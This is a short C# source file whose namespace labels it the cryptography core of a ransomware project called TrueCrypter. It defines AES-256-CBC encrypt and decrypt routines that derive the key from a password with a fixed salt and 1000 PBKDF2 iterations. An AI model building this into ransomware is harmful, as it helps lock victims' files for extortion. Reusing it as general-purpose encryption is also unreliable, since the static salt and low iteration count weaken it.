using System.IO;
using System.Security.Cryptography;

namespace TrueCrypter.Ransomware.Core.Cryptography;

public class AES
{
	private MemoryStream mStream;

	private AesCryptoServiceProvider AESCryptoServiceProvider = new AesCryptoServiceProvider();

	private CryptoStream cStream;

	private byte[] Salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };

	public byte[] EncryptBytes(byte[] Bytes, byte[] Password)
	{
		AESCryptoServiceProvider.KeySize = 256;
		AESCryptoServiceProvider.BlockSize = 128;
		AESCryptoServiceProvider.Padding = PaddingMode.ANSIX923;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Password, Salt, 1000);
		AESCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(AESCryptoServiceProvider.KeySize / 8);
		AESCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(AESCryptoServiceProvider.BlockSize / 8);
		AESCryptoServiceProvider.Mode = CipherMode.CBC;
		mStream = new MemoryStream();
		using (cStream = new CryptoStream(mStream, AESCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cStream.Write(Bytes, 0, Bytes.Length);
			cStream.Close();
		}
		return mStream.ToArray();
	}

	public byte[] DecryptBytes(byte[] Bytes, byte[] Password)
	{
		AESCryptoServiceProvider.KeySize = 256;
		AESCryptoServiceProvider.BlockSize = 128;
		AESCryptoServiceProvider.Padding = PaddingMode.ANSIX923;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Password, Salt, 1000);
		AESCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(AESCryptoServiceProvider.KeySize / 8);
		AESCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(AESCryptoServiceProvider.BlockSize / 8);
		AESCryptoServiceProvider.Mode = CipherMode.CBC;
		mStream = new MemoryStream();
		using (cStream = new CryptoStream(mStream, AESCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cStream.Write(Bytes, 0, Bytes.Length);
			cStream.Close();
		}
		return mStream.ToArray();
	}
}
